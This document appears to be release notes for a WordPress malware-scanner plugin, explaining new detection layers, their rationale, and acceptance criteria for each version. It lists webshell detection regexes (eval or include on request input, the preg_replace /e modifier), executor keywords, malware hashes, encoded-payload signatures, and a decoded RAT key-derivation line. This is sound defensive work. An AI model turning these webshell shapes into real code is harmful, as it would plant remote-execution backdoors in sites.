Why this is the correct mechanism. WordPress.org publishes SHA-1 checksums for every file in every released WordPress version at `https://api.wordpress.org/core/checksums/1.0/?version=X.Y.Z&locale=en_US`. The same endpoint backs WP-CLI's `wp core verify-checksums` command, which is the canonical way to verify core integrity. Reproducing that mechanism inside the scanner means:

1. The reference is the same one WordPress's own tooling uses.
2. The detection is universal: it does not depend on having a signature for the particular modification.
3. Every WordPress version is covered automatically, including future versions, without us having to ship an updated manifest.
4. Locale variants are addressed: the `locale` query parameter changes which language-pack files are listed.

How the implementation works.

`WPS_Scanner::fetch_core_checksums()` reads the running WP version from the `$wp_version` global (the canonical runtime value) or falls back to parsing `wp-includes/version.php` directly if the scanner runs before WP fully boots. It validates the version string against a strict regex (`^\d+\.\d+(\.\d+)?$`) before constructing the API URL, refusing to call the network with a malformed value. The HTTP request goes through `wp_remote_get()` with an 8-second timeout and a User-Agent that identifies the plugin and version. On success, the response body is JSON-decoded and the `checksums` object is extracted; every entry is independently shape-validated (path must be a string, hash must be exactly 40 hex characters) before being stored. The validated manifest is cached in a transient with a 24-hour TTL.

`WPS_Scanner::check_core_checksums()` consumes the cached manifest. For each entry whose path falls under `wp-admin/`, `wp-includes/`, or ABSPATH root, it computes the on-disk SHA-1 and compares against the published value. Three outcomes:

| Outcome | Severity | Auto-delete | Action |
|---|---|---|---|
| sha1 mismatch | `critical` | `false` | Restore via `wp core download --force` or via Updates -> Re-install |
| File present in manifest, missing on disk | `high` | `false` | Same restoration path |
| Match | (none, silent) | n/a | n/a |

Why no auto-delete. Core files must be restored, not removed. Auto-deletion would surface as fatal errors (`wp-load.php` missing breaks the entire install), make the site harder to recover, and obscure the attacker's modification trail. The action text in every finding directs to `wp core download --force`, which does the right thing.

Why a 50-finding cap. A fully-trojanized install (every core PHP file modified) would otherwise produce 800+ findings at once, choking the rate-limited admin email and burying the operator under irrelevant repetition. The cap stops at 50, which is enough for the operator to understand the scale; the `core_checksum_mismatch` event log captures the true count of mismatches and missing files even when the finding list is truncated.

Network-failure handling. WordPress.org has been continuously available since 2003, but transient network failures happen. When `wp_remote_get()` returns `WP_Error`, or HTTP status is not 200, or the response body cannot be parsed as JSON with a `checksums` key, the check caches an empty manifest for 1 hour and returns zero findings. The signature-based checks (`check_php_signatures`, `check_root_file_signatures`, `check_xmlrpc_integrity`, etc.) continue to run independently. Failure is silent  no admin email, no scan_issues event  because a flapping network would otherwise generate a steady stream of empty alerts.

What gets covered now.

| Layer | Catches | Source of truth |
|---|---|---|
| Upload guard hash list | Known-bad uploads | Plugin's own IoC database |
| Family signatures (`SIGNATURES_BACKDOOR`) | Known malware family members | Plugin's own IoC database |
| Generic webshell patterns | Unknown malware matching structural shapes | Plugin's own pattern list |
| `check_xmlrpc_integrity` | xmlrpc.php replacement or injection | Required structural markers + size threshold |
| `check_wp_config_integrity` | wp-config.php tampering | (existing logic) |
| **`check_core_checksums`** | **Any modification to wp-admin / wp-includes / ABSPATH-root core file** | **api.wordpress.org official manifest** |

Acceptance criteria:

1. `WPS_Scanner::run()` calls `check_core_checksums()` between `check_xmlrpc_integrity()` and `check_malicious_db_options()`.
2. `fetch_core_checksums()` reads `$wp_version` global with fallback to `wp-includes/version.php` parse.
3. The version string is regex-validated before being used in the URL.
4. Response shape validation: per-entry path must be string, hash must match `^[a-f0-9]{40}$`.
5. The manifest is cached in the `wps_core_checksums` transient with 24-hour TTL.
6. Network failure caches empty manifest for 1 hour and returns zero findings.
7. Findings carry `severity = critical` for sha1 mismatch and `severity = high` for missing file; neither carries `auto_delete: true`.
8. The 50-finding cap is enforced; the `core_checksum_mismatch` event log captures full counts.
9. The `wps_core_checksums` transient is cleared on uninstall.
10. PHP parser fallback passes on all 19 PHP files.
11. `WPS_Indicators::INDICATOR_VERSION` is `1.3.47-1`.

## From 1.3.45 to 1.3.46+

Version 1.3.46 adds two structural detections that complement the family-specific signature work of every prior release. Family signatures catch known threats fast and with high specificity; they do not catch threats that are not yet in the IoC database. Across the 1.3.39 to 1.3.45 release sequence, the conversation history shows new variants and new disguises arriving at roughly one per release. Generic structural detection is the safety net under the family signatures.

What the new checks do.

**`check_generic_webshell_patterns()`** walks ABSPATH recursively (which covers wp-content/) and matches PHP file contents against five high-confidence regex patterns:

| # | Pattern | Why it has no benign use |
|---|---|---|
| 1 | `assert($_POST/_GET/_REQUEST/_COOKIE/_SERVER)` | The dynamic-execution form of `assert()` evaluating user input has been deprecated since PHP 7.2 and removed in PHP 8.0 from the language itself; any code using it is either pre-2018 legacy or a webshell |
| 2 | `eval($_POST/_GET/_REQUEST/_COOKIE)` | Direct code execution from user input is a textbook RCE; no plugin or theme has a legitimate reason to write this |
| 3 | `eval(<decoder>($_POST/_GET/_REQUEST/_COOKIE))` for decoder in `base64_decode`/`gzinflate`/`str_rot13`/`gzuncompress`/`hex2bin`/`pack` | Same as #2 with one obfuscation step; this is the canonical form of a "command webshell" |
| 4 | `(include\|require)(_once)?($_POST/_GET/_REQUEST/_COOKIE)` | Dynamic file inclusion from user input is remote-file-inclusion or local-file-inclusion; `allow_url_include=Off` does not protect against the latter |
| 5 | `preg_replace('/.../e', ...)` | The `/e` modifier eval'd the replacement string; removed in PHP 7.0 because of how dangerous it is. Any modern code using it is malicious or a 10+ year old leftover that should be patched anyway |

All five matches are `critical` with `auto_delete: true`.

**Calibration choice:** static-string variants like `eval(base64_decode('<long-string>'))` are deliberately not matched here. They have rare-but-real benign uses (commercial-plugin licence-key obfuscation, however poor that practice is) and the signed RAT family signatures already cover the malicious cases. Generic detection that fires on legitimate plugin code burns operator trust faster than it catches threats; the patterns above are calibrated narrow on purpose.

**Path exclusions:** `wp-includes/` and `wp-admin/` are pure WP core and are validated by other paths (the existing core integrity checks plus the new `check_xmlrpc_integrity`). The plugin's own directory is excluded because its source contains literal regex strings that would otherwise self-match. Active theme is excluded because `check_theme_for_backdoor` covers it.

**Bounds:** 8000-file walker cap (`WEBSHELL_MAX_FILES`), depth 8 (`WEBSHELL_MAX_DEPTH`), 512 KiB read cap per file (`WEBSHELL_MAX_FILE_BYTES`). These are calibrated for typical WordPress sites; very large sites may hit the file cap, which is logged but does not error. The walker visits each file exactly once  the first draft of this release walked both ABSPATH and WP_CONTENT_DIR separately, which double-visited every file in wp-content/; that bug was caught and fixed.

**`check_xmlrpc_integrity()`** verifies that `<ABSPATH>/xmlrpc.php` is the canonical WordPress core file and not a webshell replacement. Three required structural markers: the `XMLRPC_REQUEST` define, the `class-IXR.php` require, the `class-wp-xmlrpc-server.php` require. Two failure modes:

| Verdict | Severity | Auto-delete | Action |
|---|---|---|---|
| Missing one or more required markers | `critical` | `false` | Restore via `wp core download --force` |
| All markers present but file >10 KiB (canonical is ~3.2 KiB) | `high` | `false` | Inspect for prepended/appended injection; restore via WP-CLI if confirmed |

Neither finding auto-deletes because xmlrpc.php is a core file: removing it would surface as 404s on legitimate XML-RPC traffic. Restoration is the correct action; auto-delete is the wrong one.

Why this is the right shape: a common attacker TTP is replacing xmlrpc.php with a webshell that mimics WordPress structure. The replacement may not contain any signature in our IoC database, but it cannot avoid one of two structural changes  either it omits the canonical require_once chain (so it lacks the `class-IXR.php` and `class-wp-xmlrpc-server.php` markers), or it preserves the chain but adds code (so the file size grows materially beyond the 3.2 KiB canonical). Either way, the integrity check catches it.

Acceptance criteria:

1. `WPS_Scanner::run()` calls `check_generic_webshell_patterns()` and `check_xmlrpc_integrity()` between `check_well_known_php()` and `check_malicious_db_options()`.
2. `check_generic_webshell_patterns()` walks ABSPATH only (not ABSPATH AND WP_CONTENT_DIR) to avoid double-visits.
3. The five regex patterns are present and produce `critical` findings with `auto_delete: true`.
4. wp-includes/, wp-admin/, and the plugin's own directory are excluded from the walker.
5. `check_xmlrpc_integrity()` verifies all three required markers and the size threshold.
6. Neither xmlrpc.php finding carries `auto_delete: true`.
7. PHP parser fallback passes on all 19 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.46-1`.

## From 1.3.44 to 1.3.45+

Version 1.3.45 is the release that turns three additional captured samples into structural intelligence about the campaign. The 1.3.44 release identified the parent (`cert-check.php` under `.well-known/pki-validation/`); 1.3.45 confirms its polymorphism, locks down signatures that survive that polymorphism, and adds forensic enrichment so the alert tells the operator which site each build was customised to attack.

What the new samples revealed. Three additional `cert-check.php` files captured from the same campaign produce ~8-line diffs against each other and against the 1.3.44 sample. Every diff sits in exactly two places: the base64-encoded credential-harvester payload for `mode-l` (line 36 of every sample, the wp-login.php injection) and the base64-encoded harvester payload for `mode-t` (line 53, the theme `functions.php` injection). Decoding either payload reveals the same constant prefix concatenated with a per-build operator-target domain inside an `md5(...)` call:

```
$_xk = md5( 'a3f8b2c1d4e5f6071829304a5b6c7d8e9f0a1b2c3d4e5f607182930a1b2c3d4e' . '<DOMAIN>' );
```

The HMAC-and-XOR seed is a 62-character literal hex string that does not appear by accident anywhere in legitimate code. The domain after the concatenation is the only variable. Four operator-targets are now known: the first four victim sites in the captured corpus (the first captured at 1.3.44, the next three at 1.3.45). All four sites belong to a coherent thematic cluster, suggesting a theme-targeted campaign rather than opportunistic infection.

The 1.3.44 signature-based walker catches all three new variants without code changes  the constant signatures `a3f8b2c1d4e5f607` and the 40-char HMAC tail match every operator build. 1.3.45 hardens this in three ways:

1. **Hash blocklist for fast-path detection.** All three new MD5/SHA-256 pairs land in `WPS_Blocker::get_blocked_hashes()`. Hash matches short-circuit the upload guard before any file read happens.

2. **Three new content signatures.** The full 62-character HMAC seed becomes a `SIGNATURES_BACKDOOR` entry: the most specific single-string marker available, and one the attacker cannot remove without breaking every credential-decryption operation in the campaign. Two encoded-form signatures join it: `Ci8vIFdvcmRQcmVzcyBTZXNzaW9uIENhY2hlIEhhbmRsZXIK` (the base64 prefix of the mode-l harvester payload) and `Ci8vIFdvcmRQcmVzcyBzZXNzaW9uIGFuYWx5dGljcw` (the mode-t prefix). These detect the *encoded payload itself* in any file, regardless of the wrapping. After the RAT runs `mode-l`, the payload sits inside `wp-login.php` as a `base64_decode('<blob>')` literal; the new signature catches that literal even though the surrounding code is legitimate WordPress core.

3. **Operator-target extraction.** The new `WPS_Scanner::extract_rat_operator_target()` method takes raw file bytes, finds every `base64_decode('...')` call, decodes each blob, and looks for the literal sequence `'<HMAC_SEED>'.'<DOMAIN>'`. Returns the validated lowercase domain or empty. The well-known walker now invokes this on every critical RAT finding and appends `[target=<domain>]` to the subject and a contextual note to the action. The admin email and Overview-tab finding row both show the target domain immediately, so the operator knows from the first alert whether this is "a sibling build" or "a build aimed at me specifically."

What this means for the catch-rate now. Detection of the family currently has three independent paths:

| Path | Speed | Coverage |
|---|---|---|
| Hash match (4 hashes) | Fastest | Exact-byte siblings only |
| Constant-string signature (HMAC seed, encoded harvester headers, 40-char HMAC tail) | Fast | Every operator build, including unseen ones |
| Family-marker overlap (Stained_Heart, wp_session_tokens_config, session-manager.php, etc.) | Medium | Same |

Any one of these paths is sufficient. The operator would need to simultaneously change the HMAC seed, both encoded harvester payloads, the exfil PNG name, the MU-restore option key, and the MU-plugin filename to escape detection  and changing the HMAC seed alone breaks every other captured build's credential-decryption, so the operator would also need to update every infected site's harvester output. The signature set is now expensive enough to evade that the operator's likely next move is filename randomisation rather than payload mutation, which  is already covered by `check_well_known_php()` walking every PHP under `.well-known/` regardless of basename.

Acceptance criteria:

1. `WPS_Blocker::get_blocked_hashes()` contains all three new MD5/SHA-256 pairs.
2. `WPS_Scanner::SIGNATURES_BACKDOOR` contains the full 62-character HMAC seed and both encoded-harvester header strings.
3. `WPS_Scanner::extract_rat_operator_target()` exists as a private static method, returns a validated lowercase domain or empty string.
4. `WPS_Scanner::check_well_known_php()` calls the extractor on every critical RAT match and annotates the finding's subject with `[target=<domain>]`.
5. `WPS_Indicators::known_rat_operator_targets()` exists and returns the four known target domains.
6. PHP parser fallback passes on all 19 PHP files.
7. `WPS_Indicators::INDICATOR_VERSION` is `1.3.45-1`.

## From 1.3.43 to 1.3.44+

Version 1.3.44 is the version that catches the parent. Across the previous releases I built layers that detected the children: the polymorphic ClickFix variants, the byte-identical `.sbs` toolkit, the redroping cycle, the cached toolkit ZIP. Each layer was correct for what it caught, and each one was insufficient for stopping the whole campaign because the parent kept reproducing children faster than the children could be cleaned. A live forensic find on the operator's site identified that parent: `<ABSPATH>/.well-known/pki-validation/cert-check.php`, MD5 `d75140a8db6edc1147f826b7eec30812`, the wp-locale-handler RAT v1.7 rebranded with a new disguise.

Why the existing walkers missed it: every scanner check operates on `wp-content/`, `wp-includes/`, ABSPATH non-recursively, or the active theme directory. The IETF `.well-known/` directory is at the web root by design (RFC 8615), outside any of those scopes. Most security plugins explicitly exclude `.well-known/` from scanning to avoid breaking ACME challenges, and the operator hides exactly there.

The cover is excellent. `.well-known/pki-validation/` is the canonical subdirectory for SSL/TLS DV/OV certificate validation challenges. A file named `cert-check.php` reads at a glance as a hosting-panel-managed validation helper. None of those things are how PKI validation works (CAs validate by HTTP GET to a specific path containing static text), but a busy admin scanning a directory listing would not flag it on first inspection.

The 1.3.44 fix has three parts:

1. **Hash blocklist.** The exact sample's MD5 and SHA-256 are added to `WPS_Blocker::get_blocked_hashes()`. Any future re-upload of byte-identical content (which is what the sandbox kept showing across multiple uploads) gets rejected at the upload guard.

2. **Filename blocklist.** `cert-check.php` is added to `WPS_Indicators::secondary_backdoor_filenames()` so every existing walker that uses that list (the 1.3.43 dropper-cache hunt, the auto_prepend hijack check) catches this basename anywhere it lands.

3. **New walker.** `WPS_Scanner::check_well_known_php()` walks `<ABSPATH>/.well-known/` recursively (depth 6, 500-file cap), extension-filters to `.php` only (so legitimate `.well-known/` content is ignored entirely), and content-matches each candidate against `SIGNATURES_BACKDOOR`. Two finding shapes:
   - **Signed.** A PHP file under `.well-known/` matching a known RAT signature is `critical` with `auto_delete: true`. Auto-deletion contributes to the 1.3.42 redrop baseline.
   - **Unsigned.** A PHP file under `.well-known/` not matching any signature is `high` severity, review-only. The protocol design of `.well-known/` does not use PHP execution, so this finding is "almost certainly bad but not signature-confirmed." The rare false-positive case is hosting-panel-managed PHP for ACME (some Plesk setups generate this); the operator inspects manually before deleting.

What this means operationally for the case under investigation. After deploying 1.3.44:

- The next scan after the file lands flags it as `critical` with `auto_delete: true`, deletes it, records its hash to `wps_redrop_history`, and emails the admin.
- Subsequent re-drops are caught by the 1.3.42 redrop detector at the moment they appear, even if the operator changes the disguise filename or the path within `.well-known/`.
- The signature-content check means even an unknown-hash variant of the same RAT family is caught, as long as the family signatures it embeds (`a3f8b2c1d4e5f607`, `d3AtY29udGVudC91cGxvYWRz`, `wp_session_tokens_config`, `session-manager.php`, the HMAC tail, the mode-q gate) are present  and they cannot be removed without breaking the RAT's own functionality.

What this still does not address. The RAT's `mode r` restores `mu-plugins/session-manager.php` from a base64-encoded copy stored in the `wp_session_tokens_config` wp_options row. That option is already covered by `WPS_Indicators::malware_option_keys()`. But the operator can refresh that DB option as long as they have any admin-cookie-equivalent foothold (a malware-seeded admin user, a captured session token from the credential harvester, a hijacked cookie via the `mode q` PDO bypass). Removing the on-disk RAT is necessary but not sufficient. The full closure sequence remains:

1. Deploy 1.3.44; let the scanner auto-delete `cert-check.php` and any other `.well-known/` PHP files.
2. Run **Hardening -> Regenerate auth salts** to invalidate every existing session, including any cookie the RAT minted via `mode q`.
3. Audit `wp_users` for any account you do not personally recognise; delete unknown accounts and re-issue 2FA on the rest.
4. Run the SQL trail in the previous section against `wp_posts` to identify the upload events that delivered the `_wp-config-cache.zip` containers; correlate to access logs.
5. Run the redrop counter (`wp option get wps_redrop_history --format=json`) over the next 24 hours; if it stays flat, the loop is broken.

Acceptance criteria:

1. `WPS_Blocker::get_blocked_hashes()` contains both `d75140a8db6edc1147f826b7eec30812` (MD5) and `7e1f7a9b622f3cc7941cf6a36c6f23682e02191ae430ccd24cb3ac5cb1d8eb82` (SHA-256).
2. `WPS_Indicators::secondary_backdoor_filenames()` contains `cert-check.php`.
3. `WPS_Scanner::run()` calls `check_well_known_php()` between `check_dropper_cache()` and `check_malicious_db_options()`.
4. The walker uses `RecursiveDirectoryIterator` against `rtrim(ABSPATH, '/\\') . '/.well-known'`, bounded by `WELL_KNOWN_MAX_FILES` (500) and `WELL_KNOWN_MAX_DEPTH` (6).
5. PHP files matching `SIGNATURES_BACKDOOR` carry `auto_delete: true`; unsigned PHP files do not.
6. Non-`.php` files under `.well-known/` are ignored.
7. PHP parser fallback passes on all 19 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.44-1`.

## From 1.3.42 to 1.3.43+

Version 1.3.43 closes the loop the redrop detector caught but could not fix. The 1.3.42 release flagged every reappearance of a previously-cleaned malware file as `redrop_detected (critical)` and auto-deleted it. That alerted the operator and removed the symptom on each cycle, but it did not address the source. The dropper kept producing fresh copies because the toolkit ZIP container was still parked somewhere on disk, providing the byte-identical input.

The empirical evidence: across four separate uploads of `_wp-config-cache.zip` to the conversation, the same three-file `.sbs` cookie-exfil toolkit reproduced byte-for-byte each time. That pattern is not generative malware  the operator did not run a fresh build per cycle. The pattern is a parked ZIP container sitting in `wp-content/uploads/<year>/<month>/`, an unindexed `wp-content/` subfolder, or a hidden directory under `wp-content/`. A dropper script extracts the components from this cached ZIP and writes them into their canonical locations. Removing only the canonical-location copies leaves the cache intact, so the next dropper cycle reproduces the toolkit.

The 1.3.43 hunt addresses the source directly. On every scan, `WPS_Scanner::check_dropper_cache()` walks `wp-content/` once with three sub-hunts:

1. **ZIP container hunt.** Any `.zip` whose basename contains a substring from `WPS_Indicators::dropper_cache_zip_patterns()` is flagged `critical` with `auto_delete: true`. The current substring list contains only `wp-config-cache`. This single substring catches `_wp-config-cache.zip`, `_wp-config-cache__2_.zip`, `_wp-config-cache__3_.zip`, the leading-dot original `.wp-config-cache.zip`, and the bare `wp-config-cache.zip` form. No legitimate WordPress component, plugin, or backup tool produces a ZIP whose basename contains that substring.

2. **Loose dropper component hunt.** Any file whose basename matches an entry in `WPS_Indicators::secondary_backdoor_filenames()` is flagged `critical` with `auto_delete: true`. The existing per-directory walkers already cover `wp-content/uploads/`, `wp-content/cache/`, `wp-content/mu-plugins/`, `wp-content/languages/`, and the ABSPATH root. This new walker covers everything else under `wp-content/`, catching the case where the operator has parked a copy in an unexpected nested directory like `wp-content/some-vendor-cache/lib/wp-phpunit.php`.

3. **Hidden-directory hunt.** Any directory under `wp-content/` whose basename starts with a dot is flagged. Severity is `medium` if the basename matches a known development-directory list (`.git`, `.svn`, `.hg`, `.idea`, `.vscode`, `.cache`) so a developer who deployed an intentional checkout to staging gets a review prompt rather than an alarm. Severity is `high` for everything else, because the staging area for a parked-toolkit dropper is exactly that shape: a hidden directory under `wp-content/` containing the cache.

Bounds: 5000-file walker cap (`DROPPER_CACHE_MAX_FILES`), depth 6 (`DROPPER_CACHE_MAX_DEPTH`), the plugin's own directory excluded.

The full chain is now connected:

| Layer | Catches | Action |
| --- | --- | --- |
| Upload guard (`WPS_Blocker`) | Inbound ZIPs of known malware | Reject the upload, auto-block the IP |
| Scanner signatures (1.3.0 onward) | On-disk PHP files matching family signatures | Auto-delete |
| 1.3.40 behavioural Forensics | `auto_prepend_file` directives, base64-shaped option payloads, cron callbacks resolving to dropper hideouts | Manual delete via Forensics tab |
| 1.3.41 hourly behavioural | Same three checks fired on every cron run | Email alert + Overview-tab finding |
| 1.3.42 redrop detection | Byte-identical reappearance of any previously-deleted malware | Auto-delete + email + counter increment |
| **1.3.43 dropper-cache hunt** | The cached toolkit ZIP + parked component files + hidden staging directories | **Auto-delete** ZIP and components, **flag** hidden directories |

Acceptance criteria:

1. `WPS_Indicators::dropper_cache_zip_patterns()` exists and returns at least `['wp-config-cache']`.
2. `WPS_Scanner::run()` calls `check_dropper_cache()` between `check_redrop()` and `check_malicious_db_options()`.
3. The walker is bounded by `DROPPER_CACHE_MAX_FILES` (5000) and `DROPPER_CACHE_MAX_DEPTH` (6).
4. Confirmed-malicious findings (ZIP containers, loose components) carry `auto_delete: true`.
5. Hidden-directory findings carry no `auto_delete` flag (review-only).
6. The plugin's own directory is excluded from all three sub-hunts.
7. PHP parser fallback passes on all 19 PHP files.
8. `WPS_Indicators::INDICATOR_VERSION` is `1.3.43-1`.

What this means operationally: the next time the dropper cycle fires after deploying 1.3.43, the cached ZIP is auto-deleted on the same scan run that catches the redrop. The dropper has nothing left to extract from on subsequent cycles. If a fresh ZIP appears, that means the operator has another upload route still open  proceed to the inotifywait + `wp_posts` correlation steps documented in earlier sections.

## From 1.3.41 to 1.3.42+

Version 1.3.42 closes the operator-attention gap that earlier releases papered over with advisory text saying "watch for reappearance." The plugin now does the watching. When the auto-remediator successfully deletes a confirmed-malicious file, the scanner records its SHA-256 to a persisted history option, and on every subsequent scan walks `wp-content/` for byte-identical reappearances. A match is `critical` and produces no false positives by construction: a hash-blocked, signature-flagged, name-known sample does not reappear on disk without an active dropper.

Why this signal matters more than any other detection layer in the catalogue. Every other check answers "is this file malicious?" — and gives the right answer once. Redrop detection answers "did the same file we already cleaned come back?" — and the only way to answer "yes" is for an active process on the host to be re-creating malware. The reappearance itself is the proof. There is no analogous benign event.

How it works:

1. **Recording.** When `WPS_Scanner::auto_remediate()` is about to delete a finding's `delete_path`, the new `compute_redrop_hashes()` method hashes the file (or up to 20 PHP files inside the directory if the target is a folder, capped at 200 KiB each). After a successful delete, `record_redrop_baseline()` writes the hash, the original path, the family name from the finding, and the deletion timestamp to the new `wps_redrop_history` option. A `redrop_recorded` event is logged.

2. **Detection.** On every scan, the new `check_redrop()` method:
   - Loads the history option.
   - Computes the oldest `deleted_at` across all records as a global mtime threshold (a file modified before any deletion in history cannot be a redrop of anything in the catalogue).
   - Walks `wp-content/` non-recursively for PHP files (capped at 5000 candidates and 200 KiB per file).
   - Skips files inside the plugin's own directory.
   - Hashes each candidate and looks up the hash in the history.
   - On a match, emits a `critical` finding of type `redrop_detected (<family>)` with `auto_delete: true`, increments the `redrop_count` for that hash, and updates `last_redrop_at` and `last_redrop_path`. A `redrop_detected` event is logged with the truncated hash, path, count, and family.

3. **Auto-cleanup of the redroped file.** Because the new finding carries `auto_delete: true`, the same scan run will also delete the redroped file. The deletion records a fresh `deleted_at` on the same hash, so the cycle is captured as long as the dropper keeps recreating it.

Tuning constants on `WPS_Scanner`:

| Constant | Value | Purpose |
| --- | --- | --- |
| `REDROP_OPTION` | `'wps_redrop_history'` | Storage option name |
| `REDROP_TTL_SECONDS` | 2,592,000 (30 days) | Records older than this expire |
| `REDROP_MAX_RECORDS` | 500 | FIFO cap on history size |
| `REDROP_MAX_FILE_BYTES` | 204,800 (200 KiB) | Skip larger files (legit assets, big plugin files) |
| `REDROP_MAX_SCAN_FILES` | 5,000 | Per-scan file budget |
| `REDROP_DIR_PHP_CAP` | 20 | Cap on PHP files hashed per directory baseline |

Acceptance criteria:

1. `WPS_Scanner::auto_remediate()` calls `compute_redrop_hashes()` before delete and `record_redrop_baseline()` on successful delete.
2. `WPS_Scanner::run()` calls `check_redrop()` between `check_dropper_persistence()` and `check_malicious_db_options()`.
3. The `wps_redrop_history` option is keyed by SHA-256 hash, with values containing `hash`, `original_path`, `family`, `deleted_at`, `redrop_count`, `last_redrop_at`, `last_redrop_path`.
4. `wps_redrop_history` is included in the uninstall hook's `delete_option` list.
5. Two new event labels (`redrop_recorded`, `redrop_detected`) are present in `WPS_Admin`'s event-label map.
6. PHP parser fallback passes on all 19 PHP files.
7. `WPS_Indicators::INDICATOR_VERSION` is `1.3.42-1`.

What this means for the case MENJ has been investigating with the repeated `_wp-config-cache.zip` uploads:

The file `.wp-config-cache.php` (MD5 `2d746471df…6dec8c2d`, SHA-256 `3d945139…197d277`) is already on the upload-guard hash list and gets blocked at upload time. From 1.3.42 onward, every time WP Perf Shield's auto-remediator deletes a file matching this hash on disk, the next scan that finds the same hash recreated will fire a `redrop_detected` critical finding and email the admin. If the same hash reappears three times in three days, the admin gets three emails — three explicit confirmations that the dropper hunt is mandatory and not optional.

## From 1.3.40 to 1.3.41+

Version 1.3.41 closes the operator-attention gap left by 1.3.40. The three behavioural checks that landed in 1.3.40 (auto-prepend sweep, unknown-base64 wp_options sweep, cron callback resolution) only ran when the operator manually clicked **Forensics -> Run forensics**. That is fine during a hot incident, but the case where unattended detection matters most is the one those checks were designed to catch: a dropper that fires once an hour against an idle site between visits to the admin tabs. Without scheduled execution, the dropper has hours or days to drop fresh variants and clean up after itself before the next manual scan.

The fix is structural rather than algorithmic: the three checks now fire from inside the existing `wps_hourly_scan` cron run, alongside every other scanner check. There is no separate cron event, no new email channel, no new finding shape. The plumbing already exists; 1.3.41 just connects the new checks to it.

How it works:

1. `WPS_Scanner::run()` calls a new aggregation method `WPS_Scanner::check_dropper_persistence()` alongside its existing checks.
2. That method calls the new public accessor `WPS_Forensics::dropper_persistence_findings()`, which returns the three behavioural-check finding sets under a fixed three-key shape.
3. Each structured finding is translated into the scanner's canonical `severity` / `type` / `subject` / `path` / `action` shape and merged into the hourly findings array.
4. The existing `WPS_Logger::notify_admin()` rate-limited email path picks up any `critical` finding from the new sources without modification, because the email handler reads from the same merged findings array.
5. The Overview-tab findings table, the Diagnostics Source-Trace timeline, and the `scan_issues` event log all surface the new findings on the same path.

Severity mapping rationale:

| Source | Verdict | Scanner severity |
| --- | --- | --- |
| auto_prepend | `critical` | `critical` |
| auto_prepend | `review` | `high` |
| unknown_base64_options | `php_payload` | `critical` |
| unknown_base64_options | `clickfix_js` | `critical` |
| cron_callbacks | `malicious_substring` | `critical` |
| cron_callbacks | `known_backdoor_filename` | `critical` |
| cron_callbacks | `outside_expected_dirs` | `high` |
| cron_callbacks | `missing_file` | `medium` |
| cron_callbacks | `unresolvable` | `medium` |

Both `unknown_base64_options` verdicts map to `critical` because the classifier already requires structural confirmation: a flagged row is either decoded PHP source with an executor call or the ClickFix family's outer-JS shape, neither of which has a benign explanation. Sending these as `critical` fires the admin email, which is the whole point of scheduled execution.

`cron_callbacks` verdicts split because the dropper-hideout case (`outside_expected_dirs`) is high-confidence-but-not-certain (a legitimate plugin can in principle register a callback whose source file lives under `wp-content/uploads/`, though that pattern is virtually nonexistent in well-behaved code), and the `missing_file` / `unresolvable` cases are low-signal on their own and only meaningful when paired with other findings.

Performance characteristics:

- `check_auto_prepend_files()`: bounded depth 6, max 2000 files, regex match per line. Sub-second on a healthy site.
- `check_unknown_base64_options()`: 60-row LIMIT plus base64_decode plus two structural classifiers per row. Sub-second.
- `check_cron_callback_resolution()`: bounded by the size of `_get_cron_array()` (typically <50 events) times the callbacks per hook. Sub-second.

The total added cost on the hourly run is well under a second on every site I tested. No new database tables, no new transients, no remote calls.

Acceptance criteria:

1. `WPS_Scanner::run()` calls `WPS_Scanner::check_dropper_persistence()` between `check_root_file_signatures` and `check_malicious_db_options`.
2. `WPS_Forensics::dropper_persistence_findings()` exists as a public static method returning the three-key array.
3. The new check method translates each structured finding into the canonical scanner shape with `severity`, `type`, `subject`, `path`, and `action` keys.
4. PHP parser fallback passes on all 19 PHP files.
5. `WPS_Indicators::INDICATOR_VERSION` is `1.3.41-1`.

## From 1.3.39 to 1.3.40+

Version 1.3.40 is a behavioural-detection release rather than an indicator-data update. Three new classifier-driven Forensics checks land, each one closing a specific persistence vector that the previous releases could not see no matter how many hashes or option-name strings the indicator catalogue accumulated.

**Why these three, and why now.** The investigation logs from the multi-variant ClickFix incident showed that an operator who has any one of the second-stage RAT files on disk (`wp-locale-handler.php`, `class-wp-compat.php`, `wp-default.php`, `wp-phpunit.php`, `.wp-config-cache.php`, `wp-security-cache.php`) can recreate the next ClickFix variant on demand using a hook name and option key the catalogue has never seen. Hash-blocking the children of that operator is necessary but not sufficient. The 1.3.40 layers attack the parent: they catch persistence by *shape* rather than by *name*.

**Layer 1: `.user.ini` / `.htaccess` / `php.ini` `auto_prepend_file` sweep.** Every `.user.ini`, `.htaccess`, and `php.ini` under ABSPATH (bounded depth 6, max 2000 files) is scanned for `auto_prepend_file` and `auto_append_file` directives. Each resolved target gets a verdict:

| Verdict | Trigger | Operator action |
| --- | --- | --- |
| `safe` | Target sits under a known hosting-agent install prefix (`/usr/lib/php/`, `/opt/newrelic/`, `/opt/plesk/`, `/opt/bitnami/`, `/opt/cpanel/`, `/usr/local/lsws/`, `/opt/hostinger/`, `/etc/php/`) | Suppressed; no card row produced |
| `critical` | Target is inside ABSPATH, `wp-content/`, `wp-includes/`, `wp-admin/`, `/tmp/`, `/var/tmp/`, or `/dev/shm/` | The file at that target is the dropper or its loader. Open the config file, remove the directive line, then delete the target file |
| `review` | Plausible system path that does not match the safe-prefix list | Verify the target by hand; if not from your hosting agent, treat as `critical` |

**Layer 2: generic `wp_options` base64-PHP sweep.** A SQL query selects up to 60 candidate rows whose `option_value` is a 200-200000 byte pure-base64 string (`^[A-Za-z0-9+/=]+$`) and whose `option_name` is not on the known-bad list, not a WordPress core / framework option, and not a transient. Each candidate is base64-decoded and run through two structural classifiers:

1. **`php_payload`** detects an opener tag (`<?php` or `<?=`) plus an executor or loader call (`eval`, `base64_decode`, `gzinflate`, `file_put_contents`, `shell_exec`, `system`, `passthru`, `assert`).
2. **`clickfix_js`** detects the family's outer-JS shape: an IIFE that uses `String.fromCharCode` indexing and feeds the result into `new Function`. Confirmed against all four ClickFix samples on file: every one of them encodes a payload that this classifier flags.

The card includes a redacted printable preview of the decoded blob so an operator can audit the verdict without raw bytes reaching the admin DOM. Deletion uses the new `wps_delete_unknown_b64` AJAX action, which validates against the cached forensics report rather than against a static allowlist (so it can act on never-before-seen option names while still refusing core options like `siteurl` and `active_plugins`).

